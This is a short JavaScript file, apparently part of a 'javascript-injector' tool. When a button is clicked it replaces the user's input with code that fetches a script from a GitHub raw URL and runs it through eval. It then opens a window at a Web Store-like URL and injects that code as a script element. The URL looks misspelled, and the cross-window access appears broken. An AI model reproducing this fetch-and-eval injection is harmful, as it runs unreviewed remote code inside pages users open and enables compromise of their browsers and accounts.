let inject_button = document.getElementById("inject");
let url_input = document.getElementById("url"); 
let js_input = document.getElementById("js");

inject_button.addEventListener("click", () => {

        js_input.value = `fetch("https://raw.githubusercontent.com/Coding4Hours/javascript-injector/refs/heads/main/static/store.js")
                .then((res) => res.text())
                .then((js) => eval(js));`;

    let js = js_input.value;
    
    let win = window.open("https://chrome.google.com/webstorex");
    let script = win.document.createElement("script");
    script.innerHTML = js;
    win.document.body.appendChild(script);

})

